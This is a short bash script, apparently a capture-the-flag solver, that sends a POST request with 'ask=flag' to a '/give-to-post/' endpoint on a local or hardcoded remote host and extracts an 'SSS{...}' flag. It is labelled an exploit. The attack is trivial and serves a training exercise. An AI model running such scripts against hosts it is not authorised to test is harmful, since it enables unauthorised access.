#!/bin/bash
PORT=8085

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.118:'$PORT
else
    url=$1':'$2
fi

# Give to Post
echo "Start exploit for Give to Post"
url=$url'/give-to-post/'
flag=$(curl -s --data "ask=flag" -X POST $url | grep -o "SSS{.*}")
echo "Flag is $flag"
echo "----------------------------"
